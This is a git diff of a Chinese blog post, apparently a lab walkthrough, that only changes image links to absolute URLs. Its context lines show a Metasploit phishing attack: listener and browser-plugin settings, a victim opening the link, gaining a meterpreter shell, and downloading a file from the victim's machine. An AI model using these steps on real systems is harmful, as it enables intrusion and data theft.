@@ -32,16 +32,16 @@ set lhost 192.168.88.130
 set allowpowershellprompt ture //设置浏览器插件
 exploit
 ```
-![](/images/20210327-1.png)
+![](https://lcy2218.github.io/images/20210327-1.png)
 
 ## 0x2 将钓鱼网站链接放置在跳板机（服务器中）
 
-![](/images/20210327-2.png)
-![](/images/20210327-3.png)
+![](https://lcy2218.github.io/images/20210327-2.png)
+![](https://lcy2218.github.io/images/20210327-3.png)
 
 ## 0x3 受害者访问钓鱼链接
 
-![](/images/20210327-4.png)
+![](https://lcy2218.github.io/images/20210327-4.png)
 
 ## 0x4 kail建立连接以及获取shell
 
@@ -49,18 +49,18 @@ exploit
 sessions //查看会话
 sessions -i 1 //获取shell
 ```
-![](/images/20210327-5.png)
-![](/images/20210327-6.png)
-![](/images/20210327-7.png)
+![](https://lcy2218.github.io/images/20210327-5.png)
+![](https://lcy2218.github.io/images/20210327-6.png)
+![](https://lcy2218.github.io/images/20210327-7.png)
 
 ## 0x5 搜索可疑文件
-![](/images/20210327-8.png)
-![](/images/20210327-9.png)
+![](https://lcy2218.github.io/images/20210327-8.png)
+![](https://lcy2218.github.io/images/20210327-9.png)
 
 ## 0x6 下载可疑文件
 
 ```c
 download c:/lcy1.txt /root //meterpreter模式下
 ```
-![](/images/20210327-10.png)
-![](/images/20210327-11.png)
+![](https://lcy2218.github.io/images/20210327-10.png)
+![](https://lcy2218.github.io/images/20210327-11.png)
